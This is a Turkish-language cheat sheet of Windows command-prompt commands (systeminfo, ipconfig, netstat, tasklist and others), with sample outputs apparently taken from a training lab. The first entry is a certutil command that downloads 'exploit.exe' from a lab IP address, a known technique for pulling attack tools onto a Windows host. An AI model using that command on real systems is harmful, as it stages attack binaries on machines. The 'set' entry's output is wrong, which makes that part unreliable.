Windowsun içine başka sunucudan veri aktarımını yapar
```bash
C:\> certutil -urlcache -f http://10.9.6.1:80/exploit.exe exploit.exe

```
Windowsun env değerlerini verir
```bash
C:\>set
```
Çıktı:
```
Microsoft Windows [Version 10.0.17763.1821]
```
---
Windowsun versionunu verir

```bash
C:\>ver
```
Çıktı:
```
Microsoft Windows [Version 10.0.17763.1821]
```
---
systeminfo Komutu çalıştırarak sistem hakkında işletim sistemi bilgileri

```bash
C:\>systeminfo
```
Çıktı:
```
C:\>systeminfo

Host Name:                 WIN-SRV-2019
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
[...]
```
---
System hakkında detaylıca bilgi verir .

```bash
C:\>systeminfo
```
Çıktı:
```
C:\>systeminfo

Host Name:                 WIN-SRV-2019
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
[...]
```
---
Ağ yapılandırmanız hakkında daha fazla bilgi için de kullanabilirsiniz ipconfig /all. Aşağıdaki terminalde gösterildiği gibi, DNS sunucularımızı görüntüleyebilir ve DHCP'nin etkinleştirildiğini doğrulayabiliriz .

```bash
C:\>ipconfig /all
```
Çıktı:
```
C:\>ipconfig /all

Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : Amazon Elastic Network Adapter
   Physical Address. . . . . . . . . : 02-B7-DF-1D-0D-99
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::90df:4861:ba40:f2a8%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.230.237(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Wednesday, May 1, 2024 2:38:05 PM
   Lease Expires . . . . . . . . . . : Wednesday, May 1, 2024 4:08:07 PM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 134353458
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-E3-D1-2B-0E-F8-30-D0-72-3F
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
```
---
Bir ana bilgisayarı veya etki alanını arar ve IP adresini döndürür. Sözdizimi varsayılan ad sunucusunu kullanarak nslookup example.comarayacaktır ; ancak, ad sunucusunu kullanacaktır . 
```bash
C:\>nslookup example.com
```
Çıktı
```
Server:  ip-10-0-0-2.eu-west-1.compute.internal
Address:  10.0.0.2

Non-authoritative answer:
Name:    example.com
Addresses:  2606:2800:21f:cb07:6820:80da:af6b:8b2c
          93.184.215.14

C:>nslookup example.com 1.1.1.1
Server:  one.one.one.one
Address:  1.1.1.1

Non-authoritative answer:
Name:    example.com
Addresses:  2606:2800:21f:cb07:6820:80da:af6b:8b2c
          93.184.215.14
```

---

Bu komut, geçerli ağ bağlantılarını ve dinleme portlarını görüntüler. netstat
```bash
netstat -abon
```
çıktı:
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID 
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2116
 [sshd.exe]
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       820
  RpcSs 
 [svchost.exe]
[...]
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2036
 [spoolsv.exe]
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       584 
 Can not obtain ownership information
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       592
 [lsass.exe]
  TCP    10.10.230.237:22       10.11.81.126:53486     ESTABLISHED     2116 
 [sshd.exe]
 [...]

```
---

- Gizli ve sistem dosyalarını da görüntüler.

```bash
dir /a

```
- Mevcut dizindeki ve tüm alt dizinlerdeki dosyaları görüntüler.

```bash
dir /s
```
---
```bash
tree
```
Çıktı:
```
Folder PATH listing
Volume serial number is A8A4-C362
C:.
├───Desktop
├───Documents
├───Downloads
├───Favorites
├───Links
├───Music
├───Pictures
├───Saved Games
└───Videos
```
 ---
 dosya silme 
```bash
C:\>del dosya_name
```
 ---
 dosya silme 
```bash
C:\>erase dosya_name
```
---
 dosya taşıma 
```bash
C:\>move dosya_name
```
---
Çalışan işlemleri görebiliriz
```bash
C:\>tasklist
```
çıktı
```
Image Name                     PID Session Name        Session#    Mem Usage 
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0         88 K
Registry                        84 Services                   0     50,700 K
smss.exe                       276 Services                   0      1,132 K
```
filter ile task list kullanımı
```bash
C:\>tasklist /FI "imagename eq sshd.exe"
```
Çıktı
```
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
sshd.exe                      2116 Services                   0      6,992 K
sshd.exe                      2712 Services                   0      7,668 K
sshd.exe                      4752 Services                   0      7,372 K
```
işlemi durdurma
```bash
taskkill /PID target_pid
```
---
dosya sistemini ve disk birimlerini hatalar ve bozuk sektörler açısından denetler.
```bash
chkdsk
```
yüklü aygıt sürücülerinin listesini görüntüler.
```bash
driverquery
```
 Sistem dosyalarını bozulmalara karşı tarar ve mümkünse onarır.
```bash
sfc /scannow
```
---


